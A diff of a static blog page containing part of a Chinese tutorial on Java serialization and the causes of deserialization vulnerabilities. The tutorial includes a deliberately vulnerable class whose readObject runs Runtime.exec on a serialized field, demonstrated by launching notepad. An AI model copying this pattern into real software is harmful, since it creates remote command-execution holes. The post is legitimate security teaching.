+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span><span class="keyword">throws</span> IOException,ClassNotFoundException &#123;</span><br><span class="line">	username = ois.readUTF();</span><br><span class="line">    type = ois.readUTF();</span><br><span class="line">    System.out.println(<span class="string">&quot;Test Serialize writeObject&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>读写顺序要一致，先写入username变量，那么读取时也要先读取username变量，不然会报错。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestSerialize</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">123123123L</span>;</span><br><span class="line">    <span class="keyword">public</span> String username;</span><br><span class="line">    <span class="keyword">transient</span> <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestSerialize</span><span class="params">(String name, String pass, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = name;</span><br><span class="line">        <span class="built_in">this</span>.password = pass;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testUse</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;usernaem: &quot;</span>+username);</span><br><span class="line">        System.out.println(<span class="string">&quot;password: &quot;</span>+password);</span><br><span class="line">        System.out.println(<span class="string">&quot;age: &quot;</span>+age);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream oos)</span><span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        oos.writeUTF(username);</span><br><span class="line">        oos.writeUTF(password);</span><br><span class="line">        System.out.println(<span class="string">&quot;Test Serialize writeObject&quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span><span class="keyword">throws</span> IOException,ClassNotFoundException &#123;</span><br><span class="line">        username = ois.readUTF();</span><br><span class="line">        password = ois.readUTF();</span><br><span class="line">        System.out.println(<span class="string">&quot;Test Serialize writeObject&quot;</span>);&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">TestSerialize</span> <span class="variable">ser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestSerialize</span>(<span class="string">&quot;GhostToKnow&quot;</span>,<span class="string">&quot;123123&quot;</span>,<span class="number">19</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./Test.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">            oos.writeObject(ser);</span><br><span class="line">            </span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./Test.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">            <span class="type">TestSerialize</span> <span class="variable">test</span> <span class="operator">=</span> (TestSerialize)ois.readObject();</span><br><span class="line">            test.testUse();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/04/05/hD8SZ1xycEI6oAG.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/05/hD8SZ1xycEI6oAG.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221126162950498"></p>
+<p>自定义读写只有name和pass没有age，所以这里就算给age传入了19但输出age为0</p>
+<p>在自定义writeObject时手动把被transient修饰的变量写进去，在读取readObject时也手动写出来，pass是可以被修改拿到的。</p>
+<h2 id="反序列化漏洞成因"><a href="#反序列化漏洞成因" class="headerlink" title="反序列化漏洞成因"></a>反序列化漏洞成因</h2><p>序列化和反序列化本身并不存在问题。但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就可能带来安全问题。</p>
+<p>广义上来讲，传的xml，json等内容可以进行反序列化操作，再次拿到java对象，也可以叫反序列化漏洞</p>
+<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>如果自定义的readObject方法里进行了一些危险操作，那么就会导致反序列化漏洞的发生了。</p>
+<p>TestSeria</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestSerialize</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestSerialize</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.cmd = cmd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream oos)</span><span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        oos.defaultWriteObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;Test Serialize writeObject&quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span><span class="keyword">throws</span> IOException,ClassNotFoundException &#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        <span class="comment">//调用系统执行命令功能，去执行cmd这个变量的命令</span></span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">        System.out.println(<span class="string">&quot;Test Serialize writeObject&quot;</span>);&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>main</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">TestSerialize</span> <span class="variable">ser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestSerialize</span>(<span class="string">&quot;notepad&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./Test02.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">            oos.writeObject(ser);</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./Test02.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">            <span class="type">TestSerialize</span> <span class="variable">test</span> <span class="operator">=</span> (TestSerialize)ois.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/04/05/Hq78eYoA5gTCKLV.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/05/Hq78eYoA5gTCKLV.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221127133925800"></p>
+<p>在反序列化的时候会主动调用readObject就会触发命令执行，弹出了记事本。</p>
+<p>这里只是演示，应该没有人会在写Runtime.getRuntime().exec(cmd);大多时是利用反射去构造java方法，再通过反射去调用java方法</p>
+<p>Runtime.exec()：直接在目标环境执行命令</p>
+<p>Method.invoke()：需要适当的选择方法和参数，通过反射执行java方法</p>
+<p>RMI&#x2F;JNDI&#x2F;JRMP等：通过引用远程对象，间接实现任意代码执行的效果</p>
+<p>后续介绍java反射，CC6链源码分析，LazyMap利用连，ysoser工具的使用</p>
+<p>本博客的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。</p>
+<p>本文所提供的工具仅用于学习、漏洞验证，禁止用于非法用途！</p>
 
   </div>
   
@@ -2511,10 +2544,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2023-03-29T14:32:08+01:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2023-04-05T06:56:01+01:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Mar 29, 2023</p>
+    <p>更新于：Apr 5, 2023</p>
   </a>
 </div>
 
@@ -2523,8 +2556,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         
           
   
-  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Struts2/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>Struts2</p></a></div>
-  <span hidden itemprop="keywords">Struts2</span>
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>反序列化</p></a></div>
+  <span hidden itemprop="keywords">反序列化</span>
 
 
         
@@ -2537,7 +2570,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2023/03/29/Struts2-S2-061-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-17530%EF%BC%89%E5%A4%8D%E7%8E%B0/&title=Struts2 S2-061 远程命令执行漏洞（CVE-2020-17530）复现 - GhostToKnow&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2023/04/05/java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%B8%80/&title=java安全 反序列化(一) - GhostToKnow&summary="
           
           >
           
@@ -2549,7 +2582,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2023/03/29/Struts2-S2-061-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-17530%EF%BC%89%E5%A4%8D%E7%8E%B0/&title=Struts2 S2-061 远程命令执行漏洞（CVE-2020-17530）复现 - GhostToKnow&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2023/04/05/java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%B8%80/&title=java安全 反序列化(一) - GhostToKnow&summary="
           
           >
           
@@ -2561,7 +2594,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2023/03/29/Struts2-S2-061-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-17530%EF%BC%89%E5%A4%8D%E7%8E%B0/&title=Struts2 S2-061 远程命令执行漏洞（CVE-2020-17530）复现 - GhostToKnow&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2023/04/05/java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%B8%80/&title=java安全 反序列化(一) - GhostToKnow&summary="
           
           >
           
@@ -2594,15 +2627,22 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
-        <a class='prev' href='/2023/04/02/Weblogic-CVE-2020-2551/'>
-          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>Weblogic CVE-2020-2551</p>
-          <p class='content'>前言2020年1月15日,Oracle发布了一系列的安全补丁,其中Oracle WebLogic Server产品有高危漏洞,漏洞编号CVE-2020-2551,CVSS评分9.8分,漏洞利用难...</p>
+        <a class='prev' href='/2023/04/05/java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/'>
+          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>java安全 反序列化(二)</p>
+          <p class='content'>[200~# java安全 反序列化(二)
+寻找反序列化链(Gadget)
+
+在项目里找漏洞
+readObject里的漏洞一般比较少
+
+寻找项目的依赖库类中的Gadget
+一些依赖也会有反序列...</p>
         </a>
       
       
-        <a class='next' href='/2023/03/29/Shiro-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2022-32532/'>
-          <p class='title'>Shiro 身份认证绕过漏洞 CVE-2022-32532<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>前言123Apache Shiro 是一个强大且易用的 Java 安全框架，通过它可以执行身份验证、授权、密码和会话管理。使用 Shiro 的易用 API，您可以快速、轻松地保护任何应用程序 —...</p>
+        <a class='next' href='/2023/04/03/volatility%E5%8F%96%E8%AF%81/'>
+          <p class='title'>volatility取证<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>前言volatility是一款开源的内存取证分析工具，由python编写，支持各种操作系统，能够对导出的windows,linux,mac osx,android等系统内存镜像进行分析。可以通过...</p>
         </a>
       
     </div>
@@ -2618,7 +2658,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="discussionUrl" content="/2023/03/29/Struts2-S2-061-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-17530%EF%BC%89%E5%A4%8D%E7%8E%B0/index.html#comments">
+      <meta itemprop="discussionUrl" content="/2023/04/05/java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%B8%80/index.html#comments">
     </span>
     <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
@@ -2660,7 +2700,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="toc-text">复现过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-text">修复建议</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%9A"><span class="toc-text">序列化基础知识：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#java-io-Serializable"><span class="toc-text">java.io.Serializable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java-io-Externalizable"><span class="toc-text">java.io.Externalizable</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">尝试序列化和反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#serialVersionUID"><span class="toc-text">serialVersionUID</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">自定义序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-text">反序列化漏洞成因</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-text">例子</span></a></li></ol></li></ol>
     </div>
   </section>
 
@@ -3257,7 +3297,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"GhostToKnow","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"GhostToKnow","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"GhostToKnow"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/漏洞复现/","name":"漏洞复现"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2023/03/29/Struts2-S2-061-远程命令执行漏洞（CVE-2020-17530）复现/","name":"Struts2 S2-061 远程命令执行漏洞（CVE-2020-17530）复现"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"GhostToKnow","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"GhostToKnow","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"GhostToKnow","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"Struts2 S2-061 远程命令执行漏洞（CVE-2020-17530）复现","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2023/03/29/Struts2-S2-061-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-17530%EF%BC%89%E5%A4%8D%E7%8E%B0/"},"author":{"@type":"Person","name":"GhostToKnow","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"GhostToKnow","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2023/03/29/Struts2-S2-061-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-17530%EF%BC%89%E5%A4%8D%E7%8E%B0/","wordCount":0,"datePublished":"2023-03-29T13:21:36.000Z","dateModified":"2023-03-29T13:32:08.442Z","articleSection":"漏洞复现","keywords":"Struts2","image":{"@type":"ImageObject","url":"https://s3.bmp.ovh/imgs/2023/03/29/43e8bf8d987eb0f2.png","width":1024,"height":768}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"GhostToKnow","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"GhostToKnow","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"GhostToKnow"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/java安全/","name":"java安全"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2023/04/05/java安全-反序列化-一/","name":"java安全 反序列化(一)"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"GhostToKnow","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"GhostToKnow","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"GhostToKnow","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"java安全 反序列化(一)","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2023/04/05/java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%B8%80/"},"author":{"@type":"Person","name":"GhostToKnow","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"GhostToKnow","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2023/04/05/java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%B8%80/","wordCount":0,"datePublished":"2023-04-05T05:39:07.000Z","dateModified":"2023-04-05T05:56:01.293Z","articleSection":"java安全","keywords":"反序列化","image":{"@type":"ImageObject","url":"https://s2.loli.net/2023/04/05/mZ9arBIUxnD2wCX.jpg","width":1024,"height":768}}]</script>
 
 
 
